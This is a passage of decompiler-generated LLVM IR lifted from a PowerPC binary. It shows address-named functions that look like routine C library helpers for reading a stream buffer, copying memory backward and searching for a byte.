  uselistorder label %dec_label_pc_1000a3a0, { 1, 0 }
  uselistorder label %dec_label_pc_1000a290, { 1, 0 }
  uselistorder label %dec_label_pc_1000a1e8, { 1, 0 }
  uselistorder label %dec_label_pc_1000a1bc, { 1, 0 }
  uselistorder label %dec_label_pc_1000a1b0, { 1, 0 }
}

define i32 @function_1000a830(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000a830:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i8, align 1
  %v0_1000a834 = load i32, i32* @lr, align 4
  store i32 %v0_1000a834, i32* %r0.global-to-local, align 4
  %v0_1000a838 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_1000a844 = add i32 %tmp, 16
  %v3_1000a844 = inttoptr i32 %v2_1000a844 to i32*
  %v4_1000a844 = load i32, i32* %v3_1000a844, align 4
  store i32 %v4_1000a844, i32* %r9.global-to-local, align 4
  %v2_1000a848 = add i32 %tmp, 24
  %v3_1000a848 = inttoptr i32 %v2_1000a848 to i32*
  %v4_1000a848 = load i32, i32* %v3_1000a848, align 4
  store i32 %v4_1000a848, i32* %r0.global-to-local, align 4
  %v2_1000a84c = icmp ult i32 %v4_1000a844, %v4_1000a848
  br i1 %v2_1000a84c, label %dec_label_pc_1000a8b4, label %dec_label_pc_1000a854

dec_label_pc_1000a854:                            ; preds = %dec_label_pc_1000a830
  %v3_1000a854 = load i16, i16* %arg1, align 2
  %v4_1000a854 = zext i16 %v3_1000a854 to i32
  %v1_1000a858 = and i32 %v4_1000a854, 131
  store i32 %v1_1000a858, i32* %r0.global-to-local, align 4
  %v2_1000a85c = icmp ugt i32 %v1_1000a858, 128
  br i1 %v2_1000a85c, label %dec_label_pc_1000a874, label %dec_label_pc_1000a864

dec_label_pc_1000a864:                            ; preds = %dec_label_pc_1000a854
  store i32 268478572, i32* @lr, align 4
  %v3_1000a868 = call i32 @function_1000be5c(i16* inttoptr (i32 128 to i16*), i32 %v4_1000a844)
  store i32 %v3_1000a868, i32* %r3.global-to-local, align 4
  %v3_1000a86c = icmp eq i32 %v3_1000a868, 0
  br i1 %v3_1000a86c, label %dec_label_pc_1000a864.dec_label_pc_1000a874_crit_edge, label %dec_label_pc_1000a950

dec_label_pc_1000a864.dec_label_pc_1000a874_crit_edge: ; preds = %dec_label_pc_1000a864
  %v0_1000a874.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000a874

dec_label_pc_1000a874:                            ; preds = %dec_label_pc_1000a864.dec_label_pc_1000a874_crit_edge, %dec_label_pc_1000a854
  %v2_1000a8d4 = phi i32 [ %v0_1000a874.pre, %dec_label_pc_1000a864.dec_label_pc_1000a874_crit_edge ], [ %tmp, %dec_label_pc_1000a854 ]
  %v1_1000a874 = inttoptr i32 %v2_1000a8d4 to i16*
  %v2_1000a874 = load i16, i16* %v1_1000a874, align 2
  %v3_1000a874 = zext i16 %v2_1000a874 to i32
  %v1_1000a878 = and i32 %v3_1000a874, 2
  store i32 %v1_1000a878, i32* %r0.global-to-local, align 4
  %v3_1000a878 = icmp eq i32 %v1_1000a878, 0
  br i1 %v3_1000a878, label %dec_label_pc_1000a8a4, label %dec_label_pc_1000a880

dec_label_pc_1000a880:                            ; preds = %dec_label_pc_1000a874
  %v1_1000a880 = call i32 @__asm_rlwinm(i32 %v3_1000a874, i32 2, i32 29, i32 29)
  %v1_1000a884 = load i32, i32* @r31, align 4
  %v2_1000a884 = add i32 %v1_1000a884, %v1_1000a880
  store i32 %v2_1000a884, i32* %r9.global-to-local, align 4
  %v1_1000a888 = add i32 %v2_1000a884, 39
  %v2_1000a888 = inttoptr i32 %v1_1000a888 to i8*
  %v3_1000a888 = load i8, i8* %v2_1000a888, align 1
  %v4_1000a888 = zext i8 %v3_1000a888 to i32
  store i32 %v4_1000a888, i32* %r0.global-to-local, align 4
  %v1_1000a88c = add nsw i32 %v3_1000a874, -1
  store i32 %v1_1000a88c, i32* %r9.global-to-local, align 4
  %v1_1000a890 = trunc i32 %v1_1000a88c to i16
  %v3_1000a890 = inttoptr i32 %v1_1000a884 to i16*
  store i16 %v1_1000a890, i16* %v3_1000a890, align 2
  %v0_1000a894 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1000a894, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000a89c = load i32, i32* @r31, align 4
  %v2_1000a89c = add i32 %v1_1000a89c, 40
  %v3_1000a89c = inttoptr i32 %v2_1000a89c to i32*
  store i32 0, i32* %v3_1000a89c, align 4
  br label %dec_label_pc_1000a954

dec_label_pc_1000a8a4:                            ; preds = %dec_label_pc_1000a874
  %v1_1000a8a4 = add i32 %v2_1000a8d4, 16
  %v2_1000a8a4 = inttoptr i32 %v1_1000a8a4 to i32*
  %v3_1000a8a4 = load i32, i32* %v2_1000a8a4, align 4
  store i32 %v3_1000a8a4, i32* %r9.global-to-local, align 4
  %v1_1000a8a8 = add i32 %v2_1000a8d4, 20
  %v2_1000a8a8 = inttoptr i32 %v1_1000a8a8 to i32*
  %v3_1000a8a8 = load i32, i32* %v2_1000a8a8, align 4
  store i32 %v3_1000a8a8, i32* %r0.global-to-local, align 4
  %v4_1000a8ac = icmp eq i32 %v3_1000a8a8, %v3_1000a8a4
  br i1 %v4_1000a8ac, label %dec_label_pc_1000a8c0, label %dec_label_pc_1000a8b4

dec_label_pc_1000a8b4:                            ; preds = %dec_label_pc_1000a8a4, %dec_label_pc_1000a830
  %v1_1000a9287 = phi i32 [ %v2_1000a8d4, %dec_label_pc_1000a8a4 ], [ %tmp, %dec_label_pc_1000a830 ]
  %v0_1000a8b4 = phi i32 [ %v3_1000a8a4, %dec_label_pc_1000a8a4 ], [ %v4_1000a844, %dec_label_pc_1000a830 ]
  %v1_1000a8b4 = inttoptr i32 %v0_1000a8b4 to i8*
  %v2_1000a8b4 = load i8, i8* %v1_1000a8b4, align 1
  %v3_1000a8b4 = zext i8 %v2_1000a8b4 to i32
  store i32 %v3_1000a8b4, i32* %r3.global-to-local, align 4
  %v1_1000a8b8 = add i32 %v0_1000a8b4, 1
  store i32 %v1_1000a8b8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000a928

dec_label_pc_1000a8c0:                            ; preds = %dec_label_pc_1000a8a4
  %v1_1000a8c0 = add i32 %v2_1000a8d4, 4
  %v2_1000a8c0 = inttoptr i32 %v1_1000a8c0 to i32*
  %v3_1000a8c0 = load i32, i32* %v2_1000a8c0, align 4
  store i32 %v3_1000a8c0, i32* %r0.global-to-local, align 4
  %v3_1000a8c4 = icmp eq i32 %v3_1000a8c0, -2
  br i1 %v3_1000a8c4, label %dec_label_pc_1000a8cc, label %dec_label_pc_1000a8dc

dec_label_pc_1000a8cc:                            ; preds = %dec_label_pc_1000a8c0
  %v1_1000a8cc = or i32 %v3_1000a874, 4
  store i32 %v1_1000a8cc, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_1000a8d4 = trunc i32 %v1_1000a8cc to i16
  store i16 %v1_1000a8d4, i16* %v1_1000a874, align 2
  br label %dec_label_pc_1000a954

dec_label_pc_1000a8dc:                            ; preds = %dec_label_pc_1000a8c0
  %v1_1000a8dc = and i32 %v3_1000a874, 768
  store i32 %v1_1000a8dc, i32* %r0.global-to-local, align 4
  %v3_1000a8dc = icmp eq i32 %v1_1000a8dc, 0
  br i1 %v3_1000a8dc, label %dec_label_pc_1000a8f0, label %dec_label_pc_1000a8e4

dec_label_pc_1000a8e4:                            ; preds = %dec_label_pc_1000a8dc
  store i32 ptrtoint (i32** @global_var_10010438.228 to i32), i32* %r3.global-to-local, align 4
  store i32 268478704, i32* @lr, align 4
  %v4_1000a8ec = call i32 @function_10006c58(i16* bitcast (i32** @global_var_10010438.228 to i16*), i32 %v3_1000a8a4)
  store i32 %v4_1000a8ec, i32* %r3.global-to-local, align 4
  %v0_1000a8f0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000a8f0

dec_label_pc_1000a8f0:                            ; preds = %dec_label_pc_1000a8dc, %dec_label_pc_1000a8e4
  %v0_1000a930 = phi i32 [ %v2_1000a8d4, %dec_label_pc_1000a8dc ], [ %v0_1000a8f0.pre, %dec_label_pc_1000a8e4 ]
  %v1_1000a8f0 = add i32 %v0_1000a930, 8
  %v2_1000a8f0 = inttoptr i32 %v1_1000a8f0 to i32*
  %v3_1000a8f0 = load i32, i32* %v2_1000a8f0, align 4
  store i32 %v3_1000a8f0, i32* %r9.global-to-local, align 4
  %v1_1000a8f4 = add i32 %v0_1000a930, 12
  %v2_1000a8f4 = inttoptr i32 %v1_1000a8f4 to i32*
  %v3_1000a8f4 = load i32, i32* %v2_1000a8f4, align 4
  store i32 %v3_1000a8f4, i32* %r0.global-to-local, align 4
  %v4_1000a8f8 = icmp eq i32 %v3_1000a8f4, %v3_1000a8f0
  br i1 %v4_1000a8f8, label %dec_label_pc_1000a930, label %dec_label_pc_1000a900

dec_label_pc_1000a900:                            ; preds = %dec_label_pc_1000a8f0
  %v2_1000a900 = add i32 %v0_1000a930, 24
  %v3_1000a900 = inttoptr i32 %v2_1000a900 to i32*
  store i32 %v3_1000a8f0, i32* %v3_1000a900, align 4
  %v0_1000a904 = load i32, i32* @r31, align 4
  store i32 %v0_1000a904, i32* %r3.global-to-local, align 4
  store i32 268478732, i32* @lr, align 4
  %v3_1000a908 = call i32 @function_1000be14(i32 %v0_1000a904, i32 %v3_1000a8f0)
  store i32 %v3_1000a908, i32* %r3.global-to-local, align 4
  %v3_1000a90c = icmp eq i32 %v3_1000a908, 0
  br i1 %v3_1000a90c, label %dec_label_pc_1000a950, label %dec_label_pc_1000a914

dec_label_pc_1000a914:                            ; preds = %dec_label_pc_1000a900
  %v0_1000a914 = load i32, i32* @r31, align 4
  %v1_1000a914 = add i32 %v0_1000a914, 20
  %v2_1000a914 = inttoptr i32 %v1_1000a914 to i32*
  %v3_1000a914 = load i32, i32* %v2_1000a914, align 4
  store i32 %v3_1000a914, i32* %r0.global-to-local, align 4
  %v1_1000a918 = add i32 %v0_1000a914, 16
  %v2_1000a918 = inttoptr i32 %v1_1000a918 to i32*
  %v3_1000a918 = load i32, i32* %v2_1000a918, align 4
  store i32 %v3_1000a918, i32* %r9.global-to-local, align 4
  %v2_1000a91c = add i32 %v0_1000a914, 24
  %v3_1000a91c = inttoptr i32 %v2_1000a91c to i32*
  store i32 %v3_1000a914, i32* %v3_1000a91c, align 4
  %v0_1000a920 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a920 = add i32 %v0_1000a920, 1
  store i32 %v1_1000a920, i32* %r0.global-to-local, align 4
  %v1_1000a924 = inttoptr i32 %v0_1000a920 to i8*
  %v2_1000a924 = load i8, i8* %v1_1000a924, align 1
  %v3_1000a924 = zext i8 %v2_1000a924 to i32
  store i32 %v3_1000a924, i32* %r3.global-to-local, align 4
  %v1_1000a928.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000a928

dec_label_pc_1000a928:                            ; preds = %dec_label_pc_1000a8b4, %dec_label_pc_1000a914
  %v1_1000a928 = phi i32 [ %v1_1000a9287, %dec_label_pc_1000a8b4 ], [ %v1_1000a928.pre, %dec_label_pc_1000a914 ]
  %v0_1000a928 = phi i32 [ %v1_1000a8b8, %dec_label_pc_1000a8b4 ], [ %v1_1000a920, %dec_label_pc_1000a914 ]
  %v2_1000a928 = add i32 %v1_1000a928, 16
  %v3_1000a928 = inttoptr i32 %v2_1000a928 to i32*
  store i32 %v0_1000a928, i32* %v3_1000a928, align 4
  br label %dec_label_pc_1000a954

dec_label_pc_1000a930:                            ; preds = %dec_label_pc_1000a8f0
  %v1_1000a930 = inttoptr i32 %v0_1000a930 to i16*
  store i32 %v0_1000a930, i32* %r3.global-to-local, align 4
  %v2_1000a934 = ptrtoint i8* %stack_var_-24 to i32
  store i32 268478784, i32* @lr, align 4
  %v5_1000a93c = call i32 @function_1000bca4(i16* %v1_1000a930, i32 %v2_1000a934, i32 1)
  store i32 %v5_1000a93c, i32* %r3.global-to-local, align 4
  %v3_1000a940 = icmp eq i32 %v5_1000a93c, 0
  br i1 %v3_1000a940, label %dec_label_pc_1000a950, label %dec_label_pc_1000a948

dec_label_pc_1000a948:                            ; preds = %dec_label_pc_1000a930
  %v3_1000a948 = load i8, i8* %stack_var_-24, align 1
  %v4_1000a948 = sext i8 %v3_1000a948 to i32
  store i32 %v4_1000a948, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000a954

dec_label_pc_1000a950:                            ; preds = %dec_label_pc_1000a864, %dec_label_pc_1000a930, %dec_label_pc_1000a900
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000a954

dec_label_pc_1000a954:                            ; preds = %dec_label_pc_1000a948, %dec_label_pc_1000a928, %dec_label_pc_1000a8cc, %dec_label_pc_1000a880, %dec_label_pc_1000a950
  store i32 %v0_1000a834, i32* %r0.global-to-local, align 4
  store i32 %v0_1000a838, i32* @r31, align 4
  %v0_1000a964 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000a964

; uselistorder directives
  uselistorder i32 %v0_1000a930, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_1000a8b4, { 1, 0 }
  uselistorder i32 %v3_1000a8a4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1000a884, { 1, 0 }
  uselistorder i32 %v3_1000a874, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_1000a8d4, { 1, 2, 0, 4, 3, 5 }
  uselistorder i8* %stack_var_-24, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r3.global-to-local, { 12, 3, 2, 1, 5, 4, 6, 7, 8, 9, 10, 11, 13, 14, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i16* @global_var_10010114.201, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000a954, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000a950, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000a928, { 1, 0 }
  uselistorder label %dec_label_pc_1000a8f0, { 1, 0 }
}

define i32 @function_1000a968(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000a968:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  %v2_1000a968 = icmp ult i32 %arg2, %arg1
  store i32 %arg1, i32* %r8.global-to-local, align 4
  %v0_1000a970 = load i32, i32* @r5, align 4
  store i32 %v0_1000a970, i32* @r11, align 4
  br i1 %v2_1000a968, label %dec_label_pc_1000a97c, label %dec_label_pc_1000a978

dec_label_pc_1000a978:                            ; preds = %dec_label_pc_1000a968
  %v0_1000a978 = call i32 @function_10007104()
  %v1_1000a97c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1000a97c

dec_label_pc_1000a97c:                            ; preds = %dec_label_pc_1000a968, %dec_label_pc_1000a978
  %v0_1000a980 = phi i32 [ %arg1, %dec_label_pc_1000a968 ], [ %v0_1000a978, %dec_label_pc_1000a978 ]
  %v1_1000a97c = phi i32 [ %v0_1000a970, %dec_label_pc_1000a968 ], [ %v1_1000a97c.pre, %dec_label_pc_1000a978 ]
  %v2_1000a97c = add i32 %v1_1000a97c, %arg2
  store i32 %v2_1000a97c, i32* %r4.global-to-local, align 4
  %v2_1000a980 = add i32 %v1_1000a97c, %v0_1000a980
  store i32 %v2_1000a980, i32* %r10.global-to-local, align 4
  %v1_1000a984 = call i32 @__asm_rlwinm.(i32 %v1_1000a97c, i32 29, i32 3, i32 31)
  store i32 %v1_1000a984, i32* %r9.global-to-local, align 4
  %v4_1000a984 = icmp eq i32 %v1_1000a984, 0
  br i1 %v4_1000a984, label %dec_label_pc_1000a9ac, label %dec_label_pc_1000a98c

dec_label_pc_1000a98c:                            ; preds = %dec_label_pc_1000a97c
  %v0_1000a98c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a98c = urem i32 %v0_1000a98c, 4
  %v3_1000a98c = icmp eq i32 %v1_1000a98c, 0
  br i1 %v3_1000a98c, label %dec_label_pc_1000a994, label %dec_label_pc_1000a9e0

dec_label_pc_1000a994:                            ; preds = %dec_label_pc_1000a9f8.dec_label_pc_1000a994_crit_edge, %dec_label_pc_1000a98c
  %v1_1000a9a0.pre = phi i32 [ %v1_1000a9a0.pre.pre, %dec_label_pc_1000a9f8.dec_label_pc_1000a994_crit_edge ], [ %v0_1000a98c, %dec_label_pc_1000a98c ]
  %v0_1000a994 = phi i32 [ %v1_1000a9f8, %dec_label_pc_1000a9f8.dec_label_pc_1000a994_crit_edge ], [ %v1_1000a984, %dec_label_pc_1000a98c ]
  store i32 %v0_1000a994, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000a998

dec_label_pc_1000a998:                            ; preds = %dec_label_pc_1000a998, %dec_label_pc_1000a994
  %v1_1000a9a0 = phi i32 [ %v2_1000a9a4, %dec_label_pc_1000a998 ], [ %v1_1000a9a0.pre, %dec_label_pc_1000a994 ]
  %v0_1000a998 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000a998 = add i32 %v0_1000a998, -4
  %v2_1000a998 = inttoptr i32 %v1_1000a998 to i32*
  %v3_1000a998 = load i32, i32* %v2_1000a998, align 4
  %v1_1000a99c = add i32 %v0_1000a998, -8
  %v2_1000a99c = inttoptr i32 %v1_1000a99c to i32*
  %v3_1000a99c = load i32, i32* %v2_1000a99c, align 4
  store i32 %v3_1000a99c, i32* %r9.global-to-local, align 4
  store i32 %v1_1000a99c, i32* %r4.global-to-local, align 4
  %v2_1000a9a0 = add i32 %v1_1000a9a0, -4
  %v3_1000a9a0 = inttoptr i32 %v2_1000a9a0 to i32*
  store i32 %v3_1000a998, i32* %v3_1000a9a0, align 4
  %v0_1000a9a4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a9a4 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000a9a4 = add i32 %v1_1000a9a4, -8
  %v3_1000a9a4 = inttoptr i32 %v2_1000a9a4 to i32*
  store i32 %v0_1000a9a4, i32* %v3_1000a9a4, align 4
  store i32 %v2_1000a9a4, i32* %r10.global-to-local, align 4
  %v0_1000a9a8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a9a8 = add i32 %v0_1000a9a8, -1
  store i32 %v1_1000a9a8, i32* %ctr.global-to-local, align 4
  %v2_1000a9a8 = icmp eq i32 %v1_1000a9a8, 0
  br i1 %v2_1000a9a8, label %dec_label_pc_1000a9ac, label %dec_label_pc_1000a998

dec_label_pc_1000a9ac:                            ; preds = %dec_label_pc_1000a998, %dec_label_pc_1000a9f8, %dec_label_pc_1000a97c
  %v0_1000a9ac = load i32, i32* @r11, align 4
  %v1_1000a9ac = urem i32 %v0_1000a9ac, 8
  store i32 %v1_1000a9ac, i32* %r5.global-to-local, align 4
  %tmp = icmp ult i32 %v1_1000a9ac, 4
  br i1 %tmp, label %dec_label_pc_1000a9c4, label %dec_label_pc_1000a9b8

dec_label_pc_1000a9b8:                            ; preds = %dec_label_pc_1000a9ac
  %v0_1000a9b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000a9b8 = add i32 %v0_1000a9b8, -4
  %v2_1000a9b8 = inttoptr i32 %v1_1000a9b8 to i32*
  %v3_1000a9b8 = load i32, i32* %v2_1000a9b8, align 4
  store i32 %v1_1000a9b8, i32* %r4.global-to-local, align 4
  %v1_1000a9bc = add nsw i32 %v1_1000a9ac, -4
  store i32 %v1_1000a9bc, i32* %r5.global-to-local, align 4
  %v1_1000a9c0 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000a9c0 = add i32 %v1_1000a9c0, -4
  %v3_1000a9c0 = inttoptr i32 %v2_1000a9c0 to i32*
  store i32 %v3_1000a9b8, i32* %v3_1000a9c0, align 4
  store i32 %v2_1000a9c0, i32* %r10.global-to-local, align 4
  %v0_1000a9c4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000a9c4

dec_label_pc_1000a9c4:                            ; preds = %dec_label_pc_1000a9ac, %dec_label_pc_1000a9b8
  %v0_1000a9cc = phi i32 [ %v1_1000a9ac, %dec_label_pc_1000a9ac ], [ %v0_1000a9c4.pre, %dec_label_pc_1000a9b8 ]
  %v3_1000a9c4 = icmp eq i32 %v0_1000a9cc, 0
  br i1 %v3_1000a9c4, label %dec_label_pc_1000aa04, label %dec_label_pc_1000a9cc

dec_label_pc_1000a9cc:                            ; preds = %dec_label_pc_1000a9c4
  store i32 %v0_1000a9cc, i32* %ctr.global-to-local, align 4
  %v2_1000a9d4.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000a9d0

dec_label_pc_1000a9d0:                            ; preds = %dec_label_pc_1000a9d0, %dec_label_pc_1000a9cc
  %v2_1000a9d4 = phi i32 [ %v3_1000a9d4, %dec_label_pc_1000a9d0 ], [ %v2_1000a9d4.pre, %dec_label_pc_1000a9cc ]
  %v0_1000a9d0 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000a9d0 = add i32 %v0_1000a9d0, -1
  %v2_1000a9d0 = inttoptr i32 %v1_1000a9d0 to i8*
  %v3_1000a9d0 = load i8, i8* %v2_1000a9d0, align 1
  store i32 %v1_1000a9d0, i32* %r4.global-to-local, align 4
  %v3_1000a9d4 = add i32 %v2_1000a9d4, -1
  %v4_1000a9d4 = inttoptr i32 %v3_1000a9d4 to i8*
  store i8 %v3_1000a9d0, i8* %v4_1000a9d4, align 1
  store i32 %v3_1000a9d4, i32* %r10.global-to-local, align 4
  %v0_1000a9d8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a9d8 = add i32 %v0_1000a9d8, -1
  store i32 %v1_1000a9d8, i32* %ctr.global-to-local, align 4
  %v2_1000a9d8 = icmp eq i32 %v1_1000a9d8, 0
  br i1 %v2_1000a9d8, label %dec_label_pc_1000aa04, label %dec_label_pc_1000a9d0

dec_label_pc_1000a9e0:                            ; preds = %dec_label_pc_1000a98c
  %v1_1000a9e0 = sub nsw i32 4, %v1_1000a98c
  store i32 %v1_1000a9e0, i32* %ctr.global-to-local, align 4
  %v1_1000a9e8 = load i32, i32* @r5, align 4
  %v2_1000a9e8 = sub i32 %v1_1000a9e8, %v1_1000a9e0
  store i32 %v2_1000a9e8, i32* @r11, align 4
  br label %dec_label_pc_1000a9ec

dec_label_pc_1000a9ec:                            ; preds = %dec_label_pc_1000a9ec, %dec_label_pc_1000a9e0
  %v2_1000a9f0 = phi i32 [ %v3_1000a9f0, %dec_label_pc_1000a9ec ], [ %v0_1000a98c, %dec_label_pc_1000a9e0 ]
  %v0_1000a9ec = load i32, i32* %r4.global-to-local, align 4
  %v1_1000a9ec = add i32 %v0_1000a9ec, -1
  %v2_1000a9ec = inttoptr i32 %v1_1000a9ec to i8*
  %v3_1000a9ec = load i8, i8* %v2_1000a9ec, align 1
  store i32 %v1_1000a9ec, i32* %r4.global-to-local, align 4
  %v3_1000a9f0 = add i32 %v2_1000a9f0, -1
  %v4_1000a9f0 = inttoptr i32 %v3_1000a9f0 to i8*
  store i8 %v3_1000a9ec, i8* %v4_1000a9f0, align 1
  store i32 %v3_1000a9f0, i32* %r10.global-to-local, align 4
  %v0_1000a9f4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a9f4 = add i32 %v0_1000a9f4, -1
  store i32 %v1_1000a9f4, i32* %ctr.global-to-local, align 4
  %v2_1000a9f4 = icmp eq i32 %v1_1000a9f4, 0
  br i1 %v2_1000a9f4, label %dec_label_pc_1000a9f8, label %dec_label_pc_1000a9ec

dec_label_pc_1000a9f8:                            ; preds = %dec_label_pc_1000a9ec
  %v0_1000a9f8 = load i32, i32* @r11, align 4
  %v1_1000a9f8 = call i32 @__asm_rlwinm.(i32 %v0_1000a9f8, i32 29, i32 3, i32 31)
  store i32 %v1_1000a9f8, i32* %r9.global-to-local, align 4
  %v4_1000a9f8 = icmp eq i32 %v1_1000a9f8, 0
  br i1 %v4_1000a9f8, label %dec_label_pc_1000a9ac, label %dec_label_pc_1000a9f8.dec_label_pc_1000a994_crit_edge

dec_label_pc_1000a9f8.dec_label_pc_1000a994_crit_edge: ; preds = %dec_label_pc_1000a9f8
  %v1_1000a9a0.pre.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000a994

dec_label_pc_1000aa04:                            ; preds = %dec_label_pc_1000a9d0, %dec_label_pc_1000a9c4
  %v0_1000aa04 = load i32, i32* %r8.global-to-local, align 4
  ret i32 %v0_1000aa04

; uselistorder directives
  uselistorder i32 %v1_1000a9f8, { 1, 2, 0 }
  uselistorder i32 %v1_1000a9f4, { 1, 0 }
  uselistorder i32 %v3_1000a9f0, { 1, 2, 0 }
  uselistorder i32 %v1_1000a9d8, { 1, 0 }
  uselistorder i32 %v3_1000a9d4, { 1, 2, 0 }
  uselistorder i32 %v1_1000a9ac, { 3, 2, 1, 0 }
  uselistorder i32 %v1_1000a9a8, { 1, 0 }
  uselistorder i32 %v2_1000a9a4, { 1, 2, 0 }
  uselistorder i32 %v1_1000a98c, { 1, 0 }
  uselistorder i32 %v0_1000a98c, { 2, 1, 0 }
  uselistorder i32 %v1_1000a97c, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 0, 4, 1, 5, 2, 7, 3, 6, 8 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 2, 5, 3, 6, 4, 7, 8, 9 }
  uselistorder i32 -8, { 2, 3, 1, 4, 0, 5, 6, 7 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm., { 1, 2, 0, 5, 6, 3, 4 }
  uselistorder i32* @r11, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder label %dec_label_pc_1000a9c4, { 1, 0 }
  uselistorder label %dec_label_pc_1000a9ac, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000a97c, { 1, 0 }
}

define i32 @function_1000aa0c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000aa0c:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_1000aa10 = urem i32 %arg1, 256
  store i32 %v1_1000aa10, i32* %r4.global-to-local, align 4
  %v0_1000aa307 = load i32, i32* @r3, align 4
  store i32 %arg2, i32* %ctr.global-to-local, align 4
  %v2_1000aa3413 = icmp eq i32 %arg2, 0
  br i1 %v2_1000aa3413, label %dec_label_pc_1000aa3c, label %dec_label_pc_1000aa38

dec_label_pc_1000aa1c:                            ; preds = %dec_label_pc_1000aa38
  %v1_1000aa1c = inttoptr i32 %v0_1000aa1c to i8*
  %v2_1000aa1c = load i8, i8* %v1_1000aa1c, align 1
  %v3_1000aa1c = zext i8 %v2_1000aa1c to i32
  %v0_1000aa20 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000aa20 = add i32 %v0_1000aa20, -1
  store i32 %v1_1000aa20, i32* %r5.global-to-local, align 4
  %v1_1000aa24 = load i32, i32* %r4.global-to-local, align 4
  %v4_1000aa24 = icmp eq i32 %v3_1000aa1c, %v1_1000aa24
  %v0_1000aa28 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000aa24, i32 %v0_1000aa28)
  %v0_1000aa2c = load i32, i32* @r3, align 4
  %v1_1000aa2c = add i32 %v0_1000aa2c, 1
  store i32 %v1_1000aa2c, i32* @r3, align 4
  %v0_1000aa34 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000aa34 = add i32 %v0_1000aa34, -1
  store i32 %v1_1000aa34, i32* %ctr.global-to-local, align 4
  %v2_1000aa34 = icmp eq i32 %v1_1000aa34, 0
  br i1 %v2_1000aa34, label %dec_label_pc_1000aa3c.loopexit, label %dec_label_pc_1000aa38

dec_label_pc_1000aa38:                            ; preds = %dec_label_pc_1000aa0c, %dec_label_pc_1000aa1c
  %v0_1000aa1c = phi i32 [ %v1_1000aa2c, %dec_label_pc_1000aa1c ], [ %v0_1000aa307, %dec_label_pc_1000aa0c ]
  %v0_1000aa38.in.in = phi i32 [ %v1_1000aa2c, %dec_label_pc_1000aa1c ], [ %v0_1000aa307, %dec_label_pc_1000aa0c ]
  %v0_1000aa38.in = urem i32 %v0_1000aa38.in.in, 4
  %v0_1000aa38 = icmp eq i32 %v0_1000aa38.in, 0
  br i1 %v0_1000aa38, label %dec_label_pc_1000aa3c.loopexit, label %dec_label_pc_1000aa1c

dec_label_pc_1000aa3c.loopexit:                   ; preds = %dec_label_pc_1000aa38, %dec_label_pc_1000aa1c
  %v0_1000aa6416.ph = phi i32 [ %v1_1000aa2c, %dec_label_pc_1000aa1c ], [ %v0_1000aa1c, %dec_label_pc_1000aa38 ]
  %v0_1000aa3c.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_1000aa40.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000aa3c

dec_label_pc_1000aa3c:                            ; preds = %dec_label_pc_1000aa3c.loopexit, %dec_label_pc_1000aa0c
